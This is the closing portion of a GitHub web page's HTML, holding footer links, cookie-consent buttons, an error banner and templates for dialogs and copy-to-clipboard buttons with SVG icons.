            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to security&quot;,&quot;label&quot;:&quot;text:security&quot;}" href="https://github.com/security" data-view-component="true" class="Link--secondary Link">Security</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to status&quot;,&quot;label&quot;:&quot;text:status&quot;}" href="https://www.githubstatus.com/" data-view-component="true" class="Link--secondary Link">Status</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to docs&quot;,&quot;label&quot;:&quot;text:docs&quot;}" href="https://docs.github.com/" data-view-component="true" class="Link--secondary Link">Docs</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to contact&quot;,&quot;label&quot;:&quot;text:contact&quot;}" href="https://support.github.com?tags=dotcom-footer" data-view-component="true" class="Link--secondary Link">Contact</a>
          </li>

          <li class="mx-2" >
  <cookie-consent-link>
    <button
      type="button"
      class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent"
      data-action="click:cookie-consent-link#showConsentManagement"
      data-analytics-event="{&quot;location&quot;:&quot;footer&quot;,&quot;action&quot;:&quot;cookies&quot;,&quot;context&quot;:&quot;subfooter&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;cookies_link_subfooter_footer&quot;}"
    >
      Manage cookies
    </button>
  </cookie-consent-link>
</li>

<li class="mx-2">
  <cookie-consent-link>
    <button
      type="button"
      class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent"
      data-action="click:cookie-consent-link#showConsentManagement"
      data-analytics-event="{&quot;location&quot;:&quot;footer&quot;,&quot;action&quot;:&quot;dont_share_info&quot;,&quot;context&quot;:&quot;subfooter&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;dont_share_info_link_subfooter_footer&quot;}"
    >
      Do not share my personal information
    </button>
  </cookie-consent-link>
</li>

      </ul>
    </nav>
  </div>
</footer>




    <ghcc-consent id="ghcc" class="position-fixed bottom-0 left-0" style="z-index: 999999" data-initial-cookie-consent-allowed="" data-cookie-consent-required="true"></ghcc-consent>


  <div id="ajax-error-message" class="ajax-error-message flash flash-error" hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
    </button>
    You can’t perform that action at this time.
  </div>

    <template id="site-details-dialog">
  <details class="details-reset details-overlay details-overlay-dark lh-default color-fg-default hx_rsm" open>
    <summary role="button" aria-label="Close dialog"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
      </button>
      <div class="octocat-spinner my-6 js-details-dialog-spinner"></div>
    </details-dialog>
  </details>
</template>

    <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;">
  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box color-shadow-large" style="width:360px;">
  </div>
</div>

    <template id="snippet-clipboard-copy-button">
  <div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none m-2">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>
<template id="snippet-clipboard-copy-button-unpositioned">
  <div class="zeroclipboard-container">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>




    </div>

    <div id="js-global-screen-reader-notice" class="sr-only mt-n1" aria-live="polite" aria-atomic="true" ></div>
    <div id="js-global-screen-reader-notice-assertive" class="sr-only mt-n1" aria-live="assertive" aria-atomic="true"></div>
  </body>
</html>

